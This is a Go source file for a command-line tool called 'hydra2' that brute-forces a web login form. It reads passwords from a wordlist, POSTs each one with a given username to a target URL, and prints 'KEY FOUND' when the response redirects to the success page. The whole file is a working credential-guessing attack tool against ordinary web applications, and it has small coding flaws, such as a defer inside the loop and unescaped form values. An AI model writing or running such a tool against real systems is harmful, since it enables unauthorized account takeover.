package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
)

func main() {
	// Command-line arguments
	username := flag.String("l", "", "Username")
	passwordFile := flag.String("P", "", "Password list file")
	url := flag.String("url", "", "Target URL")
	successRedirect := flag.String("--redirect", "", "Success redirect URL")

	flag.Parse()

	if *username == "" || *passwordFile == "" || *url == "" || *successRedirect == "" {
		fmt.Println("Usage: hydra2 -l username -P passwordlist url --redirect success_url")
		os.Exit(1)
	}

	// Open the password file
	file, err := os.Open(*passwordFile)
	if err != nil {
		fmt.Printf("Error opening password file: %v\n", err)
		os.Exit(1)
	}
	defer file.Close()

	// Read passwords and attempt login
	scanner := bufio.NewScanner(file)
	client := &http.Client{}

	keyFound := false

	for scanner.Scan() {
		password := scanner.Text()

		// Create HTTP request
		req, err := http.NewRequest("POST", *url, strings.NewReader(fmt.Sprintf("username=%s&password=%s", *username, password)))
		if err != nil {
			fmt.Printf("Error creating request: %v\n", err)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		// Execute the request
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("Error making request: %v\n", err)
			continue
		}
		defer resp.Body.Close()

		// Check if redirected to success URL
		if resp.Request.URL.String() == *successRedirect {
			fmt.Printf("KEY FOUND [%s]\n", password)
			keyFound = true
			break
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("Error reading password file: %v\n", err)
	}

	if !keyFound {
		fmt.Println("KEY NOT FOUND")
	}
}
